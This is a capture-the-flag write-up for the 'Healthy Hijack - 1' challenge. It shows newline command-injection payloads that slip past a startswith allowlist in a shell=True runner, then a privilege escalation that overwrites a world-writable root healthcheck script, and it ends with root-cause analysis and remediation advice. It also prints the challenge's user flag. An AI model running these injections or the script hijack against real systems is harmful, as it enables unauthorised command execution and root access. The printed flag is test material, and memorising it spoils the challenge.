# Healthy Hijack - 1 Write-up

## Challenge Information

- **Challenge:** Healthy Hijack - 1
- **Category:** Command injection / privilege escalation
- **Target:** `kicyber-2d9b83365b70-healthyhijack-0-0.chals.io`
- **Objective:** Escape the restricted network-command runner, enumerate the container, and escalate from `appuser` to root.

## Application Enumeration

The application exposes a command runner with the following intended allowlist:

```python
ALLOWED_COMMANDS = ["ping", "traceroute", "nslookup"]
```

The command validation only checks whether the input starts with an allowed command:

```python
def is_allowed(cmd):
    return any(cmd.startswith(c) for c in ALLOWED_COMMANDS)
```

The command is then executed through a shell:

```python
result = subprocess.run(
    cmd,
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    timeout=10
)
```

Although a blacklist removes characters such as `;`, `&`, `|`, backticks, `$(`, and `<`, newline characters are not removed. This allows additional shell commands to be appended after an allowed command.

## Command Injection

The following payload begins with an allowed command and uses a newline to execute another command:

```text
nslookup localhost
id
```

The response confirms command execution as the low-privileged application user:

```text
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

The newline bypass works because the application passes the sanitized input to `/bin/sh` through `shell=True`.

## User Flag

After obtaining command execution as `appuser`, the home directory can be enumerated:

```text
nslookup localhost
ls -la /home/appuser
```

The directory contains `user.txt`. It can be read directly:

```text
nslookup localhost
cat /home/appuser/user.txt
```

The confirmed user flag is:

```text
KPMG_CTF{9Uqut2wozejIRzFJkQKdnwydb7jOVDC51SvrAk-7T0I}
```

## Privilege Escalation Enumeration

The filesystem was searched for writable files:

```text
nslookup localhost
find /etc /opt /var /usr/local -xdev -type f -writable -ls
```

This revealed:

```text
/opt/healthcheck.sh
```

The file was root-owned but writable by the current user:

```text
-rwxrwxrwx 1 root root ... /opt/healthcheck.sh
```

Its original contents were:

```sh
#!/bin/sh
# System healthcheck
echo "OK" > /tmp/health.log
```

This is a classic writable-root-script vulnerability. If a root-owned scheduled task executes this script, modifying it allows arbitrary commands to run with root privileges.

## Root Script Hijack

The script can be replaced using the command-injection primitive:

```text
nslookup localhost
echo 'cat /root/root.txt > /tmp/rootflag' > /opt/healthcheck.sh
```

After the health check executes, the copied value can be read:

```text
nslookup localhost
cat /tmp/rootflag
```

The first value obtained from `/root/root.txt` was rejected by the challenge validator, so it should not be treated as the verified root flag. The root flag remains unresolved in this write-up.

## Exploit Summary

The complete attack chain is:

1. Identify that the application uses `shell=True`.
2. Notice that newline characters are missing from the blacklist.
3. Inject a second command after an allowed `nslookup` command.
4. Execute commands as `appuser`.
5. Read `/home/appuser/user.txt`.
6. Search for writable files and discover `/opt/healthcheck.sh`.
7. Replace the root-owned health-check script.
8. Wait for the scheduled execution.
9. Use the resulting root execution to access root-owned files.

## Root Cause

The application is vulnerable for two independent reasons:

1. **Prefix-based allowlisting:** checking `startswith()` does not ensure that the entire command is allowed.
2. **Shell execution of user input:** `shell=True` allows shell parsing and command chaining.

The privilege escalation is caused by a separate filesystem permission issue: a root-executed script is writable by an unprivileged user.

## Remediation

- Do not pass user-controlled input to `subprocess.run(..., shell=True)`.
- Use an argument array, for example:

  ```python
  subprocess.run(["nslookup", hostname], shell=False, check=True)
  ```

- Validate each argument with strict parsing rather than using a blacklist.
- Ensure root-owned scheduled scripts are not writable by unprivileged users:

  ```text
  chmod 755 /opt/healthcheck.sh
  chown root:root /opt/healthcheck.sh
  ```

- Restrict the command runner to a fixed set of validated operations and arguments.
